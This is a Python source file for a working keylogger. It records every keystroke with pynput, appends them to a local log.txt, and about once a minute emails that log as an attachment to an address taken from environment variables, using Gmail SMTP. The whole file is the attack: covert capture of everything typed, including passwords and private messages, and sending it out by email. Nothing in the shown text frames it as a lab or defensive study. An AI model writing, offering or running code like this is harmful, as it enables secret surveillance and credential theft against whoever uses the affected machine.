import pynput
from pynput.keyboard import Key,Listener
import datetime
from datetime import datetime
import smtplib
import os
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
count=0
keys=[]
starting_time=datetime.now()

def fprint(str):
    print(str)


def mail_data_file():
    smtp_port=587
    smtp_server="smtp.gmail.com"

    email_to=os.environ['email_to']
    email_from=os.environ['email_from']

    pwd=os.environ['key'] #input yor smtp mail password


    message_date=datetime.now()

    message=(f"Activity upto {message_date}")

    simple_email_context=ssl.create_default_context()

    # a MIME object to define parts of the email
    msg=MIMEMultipart()
    msg['From']=email_from
    msg['To']=email_to
    
    #Attach the body of the message
    msg.attach(MIMEText(message,'plain'))

    filename="log.txt"

    attachment=open(filename,'rb')  #r for read and b for binary

    #Encode as base 64
    attachment_package=MIMEBase('application','octet-stream')
    attachment_package.set_payload((attachment).read())
    encoders.encode_base64(attachment_package)
    attachment_package.add_header('Content-Disposition',"attachment; filename= "+ filename)
    msg.attach(attachment_package)

    text=msg.as_string()


    try:
        print("contected to server...")
        TIE_server=smtplib.SMTP(smtp_server,smtp_port)
        TIE_server.starttls(context=simple_email_context)
        TIE_server.login(email_from,pwd)

        print()
        print(f"Sending email to -{email_to}")
        TIE_server.sendmail(email_from,email_to,text)
        print(f"Email succesfully sent to-{email_to}")

    except Exception as e:
        print(e)

    finally:
        TIE_server.quit()


def on_press(key):
    global keys,count
    if(key=="Key.backspace" and len(keys)!=0):
        keys.pop()
    else:
      keys.append(key)
    count+=1

    if count>=10:
        global starting_time
        count=0
        write_file(keys)
        keys=[]
        limit_time=datetime.now()
        print(starting_time.minute," ",limit_time.minute," ",limit_time.minute-starting_time.minute)
        if limit_time.minute-starting_time.minute>=1:
            starting_time=datetime.now()
            mail_data_file()
            print("chal reah")
        

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            print(k)
            if k == "Key.space":
                f.write(" ")
            elif k=="Key.enter":
               f.write(str("\n"))
            elif k=="Key.backspace":
                f.write(str("\b"))
            elif k.find("Key")==-1:
                 f.write(str(k))


def on_relese(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_relese) as listener:
    listener.join()


print("Hello world")